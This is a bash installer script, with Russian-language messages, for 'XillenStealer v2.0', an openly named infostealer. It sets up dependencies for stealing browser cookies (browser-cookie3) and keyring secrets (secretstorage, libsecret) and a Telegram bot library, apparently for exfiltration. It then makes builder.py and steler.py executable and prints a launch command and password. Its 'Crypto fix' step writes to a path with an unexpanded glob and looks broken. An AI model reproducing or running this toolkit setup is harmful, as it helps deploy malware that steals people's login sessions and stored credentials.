#!/bin/bash

# XillenStealer v2.0 - Universal Linux Installer 
# Автор: @Bengamin_Button @XillenAdapter


SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

echo -e "\033[1;34m\n[+] Установка XillenStealer v2.0\033[0m"


if ! command -v python3 &>/dev/null; then
    echo -e "\033[1;33m[~] Установка Python3...\033[0m"
    if command -v apt-get &>/dev/null; then
        sudo apt-get update
        sudo apt-get install -y python3 python3-venv python3-pip
    elif command -v pacman &>/dev/null; then
        sudo pacman -Sy --noconfirm python python-pip
    elif command -v dnf &>/dev/null; then
        sudo dnf install -y python3 python3-virtualenv
    else
        echo -e "\033[1;31m[!] Не удалось установить Python3\033[0m"
        exit 1
    fi
fi


echo -e "\033[1;33m\n[~] Создание виртуального окружения...\033[0m"
rm -rf "$SCRIPT_DIR/venv"
python3 -m venv "$SCRIPT_DIR/venv" --clear
source "$SCRIPT_DIR/venv/bin/activate"


echo -e "\033[1;33m\n[~] Установка системных пакетов...\033[0m"
if command -v apt-get &>/dev/null; then
    sudo apt-get install -y python3-tk libxcb-xinerama0 libsecret-1-dev
elif command -v pacman &>/dev/null; then
    sudo pacman -S --noconfirm tk libxinerama libsecret
elif command -v dnf &>/dev/null; then
    sudo dnf install -y python3-tkinter libXinerama libsecret-devel
fi


echo -e "\033[1;33m\n[~] Установка Python-зависимостей...\033[0m"
"$SCRIPT_DIR/venv/bin/pip" install --upgrade pip
"$SCRIPT_DIR/venv/bin/pip" install pycryptodomex==3.20.0 browser-cookie3 pillow psutil pyTelegramBotAPI requests gputil secretstorage


echo -e "\033[1;33m\n[~] Применение фикса для модуля Crypto...\033[0m"
cat > "$SCRIPT_DIR/venv/lib/python3.*/site-packages/Crypto.py" <<EOF
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
EOF

ln -s "$SCRIPT_DIR/venv/lib/python3.*/site-packages/Crypto" "$SCRIPT_DIR/venv/lib/python3.*/site-packages/Crypto/Cipher"


if [ -f "$SCRIPT_DIR/minecraft.ttf" ]; then
    echo -e "\033[1;33m\n[~] Установка шрифта Minecraft...\033[0m"
    mkdir -p ~/.local/share/fonts/
    cp "$SCRIPT_DIR/minecraft.ttf" ~/.local/share/fonts/
    fc-cache -fv
fi


echo -e "\033[1;33m\n[~] Проверка установки...\033[0m"
"$SCRIPT_DIR/venv/bin/python3" -c "
try:
    from Crypto.Cipher import AES
    import tkinter, browser_cookie3, PIL, psutil, telebot
    print('\033[1;32m[✓] Все зависимости успешно установлены!\033[0m')
except Exception as e:
    print(f'\033[1;31m[!] Ошибка: {e}\033[0m')
    exit(1)
"


chmod +x "$SCRIPT_DIR/builder.py" 2>/dev/null
chmod +x "$SCRIPT_DIR/steler.py" 2>/dev/null

echo -e "\033[1;32m\n[✓] Установка завершена! Запустите:\033[0m"
echo -e "  source \"$SCRIPT_DIR/venv/bin/activate\" && python3 \"$SCRIPT_DIR/builder.py\""
echo -e "\033[1;33mПароль: layscrab\033[0m"
